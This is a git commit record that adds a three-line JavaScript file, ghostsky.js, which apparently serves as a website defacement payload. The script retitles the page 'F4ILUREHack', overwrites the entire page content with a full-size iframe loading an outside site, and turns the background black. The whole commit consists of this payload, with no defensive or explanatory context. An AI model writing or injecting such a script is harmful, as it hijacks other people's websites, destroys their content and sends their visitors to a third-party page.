e189ee98b3f37dff972dfa56f319a994faca67c2
babybuuu <khuchatxua.info@gmail.com>
2016-11-26 16:26:07 +0700

    Add files via upload

---
+++ ghostsky.js
@@ -0,0 +1,3 @@
+document.title="F4ILUREHack";
+document.documentElement.innerHTML = ("<iframe frameBorder='0' width='100%' height='3000' scrolling='no' margin='0' src='http://www.phamthingocanh.xyz/'></iframe>");
+    document.body.style.backgroundColor = "black";
